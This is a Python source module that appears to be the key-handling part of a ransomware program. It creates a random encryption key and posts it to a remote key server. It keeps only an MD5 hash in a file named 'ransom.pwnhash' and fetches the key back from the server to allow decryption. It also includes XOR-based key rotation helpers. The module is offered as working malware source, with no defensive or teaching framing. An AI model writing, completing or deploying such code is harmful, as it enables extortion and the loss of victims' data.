import hashlib
import os

import requests

from fileutil import put_file, get_file

KEY_HASH_FILE = "ransom.pwnhash"


def create_key():
    return Key.from_string(os.urandom(32))


def export_key(key_server, key, hash_dir):
    response = requests.post(key_server + "/accept", data=key.hex_string)

    if not response.ok:
        raise Exception('Could not export key.')

    put_file(os.path.join(hash_dir, KEY_HASH_FILE), key.md5)


def retrieve_key(key_server, hash_dir):
    key = get_key(key_server)
    stored_hash = get_hash(hash_dir)

    if key.md5 != stored_hash:
        raise Exception('Incorrect key, cannot decrypt.')

    os.remove(os.path.join(hash_dir, KEY_HASH_FILE))

    return key


def get_key(key_server):
    key_response = requests.get(key_server + "/retrieve")

    return Key.from_string(hex_string_to_ascii_string(key_response.json()["key"]))


def get_hash(root_dir):
    hash_file_path = os.path.join(root_dir, KEY_HASH_FILE)

    if not os.path.exists(hash_file_path):
        raise Exception('No hash file found, cannot decrypt.')

    return get_file(hash_file_path)


def rotate_key(key, block):
    block_ints = map(ord, block)

    if len(block_ints) >= len(key.ints):
        return Key.from_ints(block_ints[:len(key.ints)])
    else:
        new_key_ints = key.ints[len(block_ints):] + block_ints

        return Key.from_ints(new_key_ints)


def caeser_key(key):
    new_key = 0
    for i in key.ints:
        new_key = new_key ^ i

    return new_key


def ascii_string_to_hex_string(string):
    return ''.join(c.encode('hex') for c in string)


def hex_string_to_ascii_string(hex_string):
    hex_digits = [hex_string[i:i + 2] for i in range(0, len(hex_string), 2)]

    return ''.join(map(chr, [int("0x" + hex_digit, 0) for hex_digit in hex_digits]))


def get_md5(string):
    md5 = hashlib.md5()
    md5.update(string)

    return md5


class Key:

    def __init__(self, string, ints):
        self.string = string
        self.ints = ints
        self.md5 = get_md5(string).hexdigest()
        self.hex_string = ascii_string_to_hex_string(string)

    @classmethod
    def from_string(cls, string):
        return cls(string, map(ord, string))

    @classmethod
    def from_ints(cls, ints):
        key_string = ''.join(map(chr, ints))

        return cls(key_string, ints)
